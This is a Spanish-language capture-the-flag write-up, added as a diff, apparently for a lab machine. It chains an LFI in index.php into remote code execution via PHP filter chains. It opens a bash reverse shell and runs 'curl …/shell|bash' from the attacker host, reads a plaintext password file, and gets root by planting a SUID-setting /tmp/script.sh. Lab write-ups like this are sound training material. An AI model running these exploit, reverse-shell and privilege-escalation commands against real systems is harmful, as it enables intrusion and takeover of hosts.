@@ -1,0 +1,213 @@
+# Enumeracion de Puertos, Servicios y versiones
+
+nmap -Pn -n -sS -p- -sV --script 'vuln' --min-rate 5000 -vvv 172.17.0.2 -oN nmap
+
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
+|     Path: http://172.17.0.2:80/report.php
+|     Form id: 
+|     Form action: #
+|     
+|     Path: http://172.17.0.2:80/login.php
+|     Form id: 
+|_    Form action: #
+| http-enum: 
+|   /login.php: Possible admin folder
+|_  /pages/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
+
+
+# Fuzzing Web
+
+gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt,html,py,js,png,jpg -t 100 -b 404 
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 275]
+/.html                (Status: 403) [Size: 275]
+/index.php            (Status: 200) [Size: 978]
+/faq.php              (Status: 200) [Size: 1118]
+/login.php            (Status: 200) [Size: 1155]
+/downloads.php        (Status: 200) [Size: 1001]
+/pages                (Status: 301) [Size: 308] [--> http://172.17.0.2/pages/]
+/assets               (Status: 301) [Size: 309] [--> http://172.17.0.2/assets/]
+/report.php           (Status: 200) [Size: 941]
+/secret.txt           (Status: 200) [Size: 323]
+/missions.php         (Status: 200) [Size: 1033]
+/.html                (Status: 403) [Size: 275]
+/.php                 (Status: 403) [Size: 275]
+/server-status        (Status: 403) [Size: 275]
+Progress: 1661144 / 1661152 (100.00%)
+===============================================================
+
+si chequeaamos en /secret.txt conseguimos el siguiente mensaje:
+
+agent lin,
+I have encrypted this message so that you can see it alone, 
+I need you to help me with a super secret mission, 
+but I can't tell you the credentials yet, 
+you will have to see them yourself, 
+prepare something inside the page so that you can see them easily you just have to search more.
+Good luck agent lin.
+
+por lo que se puede entender, existen credenciale en algun lugar de la web, pero tras chequear 
+los diferentes directorios solo consigo referencias a un LFI, asi que probemos que conseguimos:
+
+wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u "http://172.17.0.2/index.php?FUZZ=../../../../../etc/passwd" --hh 978
+
+000000027:   200        32 L     47 W       1257 Ch     "search"                                                                                               
+
+
+curl http://172.17.0.2/index.php?search=../../../../../../../../../../../../../../etc/passwd |grep bash
+root:x:0:0:root:/root:/bin/bash
+lin:x:1001:1001:lin,,,:/home/lin:/bin/bash
+
+hemos conseguido los usuarios del sistema, pero tras chequear si tenemos acceso a los logs, no podemos acceder por lo que
+vamos a chequear si es posible la ejecucion de comandos a traves de un >> PHP Filters Chain <<
+primero nos descargamos el script que vamos a utilizar:
+
+curl -O https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py
+chmod +x php_filter_chain_generator.py
+
+sintaxis: 
+python3 php_filter_chain_generator.py --chain '<?= `<comando>` ?>'
+
+lo que nos genere el script, lo debemos colocar en el navegador desdepues del >> http://172.17.0.2/index.php?search= <aqui lo que genere el script>
+pero vamos a tratar la salida del script para que lo que nos genere, solo tengamos que copiar y pegar en el navegador
+
+
+____________________________________________________________________________________________________________________________________
+python3 php_filter_chain_generator.py --chain '<?= `whoami` ?>' |grep php |sed "s/^/http:\/\/172.17.0.2\/index.php?search=/"
+
+-primero se ejecuta el script que nos generara la cadena para la ejecucion de comandos,
+-despues limpiamos la salida con grep para obtener solo la cadena php que es lo que necesitamos,
+-por ultimos, utilizamos sed para tratar la salida de grep y concatenarlo con http://172.17.0.2/index.php?search=
+
+el resultado de este comando lo copiamos y pegamos en la url del navegador, donde podremos ver que se muestra: www-data
+por lo que tenemos ejecucion remota de comandos
+____________________________________________________________________________________________________________________________________
+
+vamos a enviarnos una reverse shell, asi que nos ponemos en escucha por netcat:
+
+nc -lnvp 4444
+
+y generamos la nueva cadena que va a ejecutar la reverse shell: /bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1
+
+python3 php_filter_chain_generator.py --chain '<?= `/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1` ?>' |grep php |sed "s/^/http:\/\/172.17.0.2\/index.php?search=/"
+
+copiamos la url generada y la pegamos en el navegador pero nos indica que la url es muy larga...
+asi que vamos a crearnos un archivo en nuestra maquina que contenga el comando de la reverse shell y levantamos 
+un server con python para enviar un comando que nos permita ejecutar una reverse shell
+
+1) creamos un archivo que contenga la reverse shell  
+echo 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1' > shell
+
+2) levantamos el server con python
+python3 -m http.server 80
+
+3) generamos la cadena con el script: php_filter_chain_generator.py para que lea el contenido del archivo shell y lo ejecute como comando
+
+python3 php_filter_chain_generator.py --chain '<?= `curl 172.17.0.1/shell|bash` ?>' |grep php |sed "s/^/http:\/\/172.17.0.2\/index.php?search=/"
+
+el resultado de este comando, lo copiamos y pegamos en el navegador para obtener la reverse shell...
+despues nos vamos netcat y hemos recibido la conexion! Estamos dentro del sistema!!!
+
+# Escala de Privilegios
+
+script /dev/null -c bash 
+stty raw -echo; fg
+reset xterm
+stty rows 38 columns 168
+export TERM=xterm
+export SHELL=bash
+find / -perm -4000 2>/dev/null					| nada
+sudo -l								| solicita passwd
+find / -name "*.txt" 2>/dev/null				| busqueda de archivos .txt en el sistema
+/var/www/html/secret.txt
+/var/www/.secret_www-data/.passwd/passwords.txt
+/var/www/.secret_www-data/agenda.txt
+
+
+conseguimos archivos que nos pueden ser util, asi que leemos la informacion:
+
+cat /var/www/.secret_www-data/.passwd/passwords.txt
+lin:agentelinsecreto
+
+su lin
+pass:agentelinsecreto
+________________________
+ahora somos el user lin:
+
+sudo -l
+No tienes permiso para listar los comandos disponibles.
+
+find / -perm -4000 2>/dev/null					|nada por aqui
+
+nos vamos al directorio del user lin y nos conseguimos con un script python (sistem.py) que si lo ejecutamos
+y vamos probando sus opciones, vemos que con la 3era arroja el siguiente mensaje: Error: No se pudo ejecutar el archivo.
+por lo que chequeamos que corre dentro del sript
+
+_______________________________________
+import subthreads
+elif option == '3':
+            subthreads.execute()
+_______________________________________
+
+esta importando el modulo subthreads y se ejecuta al momento de seleccionar la opcion 3, pero lanza el error de que 
+un archivo no pudo ser ejecutado, asi que vamos a ver si podemos leer que corre detras del modulo subthreads
+
+find / -name "subthreads*" 2>/dev/null
+/usr/local/lib/python3.12/dist-packages/subthreads.py
+ls -la /usr/local/lib/python3.12/dist-packages/subthreads.py
+
+podemos leer lo que contiene y al hacerlo nos conseguimos con:
+__________________________________________________________________________________________________________________
+import subprocess
+
+def execute():
+    try:
+        # Intenta ejecutar el archivo en /tmp
+        result = subprocess.run(['/usr/bin/sudo', '/tmp/script.sh'], capture_output=True, text=True)
+
+        # Verifica si el comando se ejecutó correctamente
+        if result.returncode != 0:
+            print("Error: No se pudo ejecutar el archivo.")
+    except FileNotFoundError:
+        # Muestra un mensaje genérico si el archivo no se encuentra
+        print("Error: El archivo no se encuentra en /tmp.")
+    except Exception as e:
+        # Muestra un mensaje genérico para cualquier otra excepción
+        print("Error: Ocurrió un problema al intentar ejecutar el archivo.")
+____________________________________________________________________________________________________________________
+
+
+por lo que vemos, busca ejecutar un archivo en /tmp (script.sh), pero si revisamos en /tmp ese archivo no existe
+por lo que vamos a crear uno con codigo malicioso y asi escalar a root
+
+echo 'chmod u+s /bin/bash' > /tmp/script.sh
+chmod +x /tmp/script.sh
+
+ahora ejecutamos el script sistem.py en el directorio del user lin y seleccionamos la opcion 3 para que se ejecute el modulo
+subthreads que a su vez va ejecutar con permisos de root el script en /tmp que hemos creado
+
+python3 sistem.py
+[MENU] Elija una opción:
+  1. Mostrar información del sistema
+  2. Realizar tarea
+  3. Ejecutar módulo subthreads
+  4. Salir
+  Opción: 3
+[MENU] Elija una opción:
+  1. Mostrar información del sistema
+  2. Realizar tarea
+  3. Ejecutar módulo subthreads
+  4. Salir
+  Opción: 4
+
+ls -la /bin/bash
+-rwsr-xr-x 1 root root 1446024 Mar 31 10:41 /bin/bash
+
+todo se ejecuto como esperaba, asi que ahora a escalar
+
+/bin/bash -p
+whoami
+#root
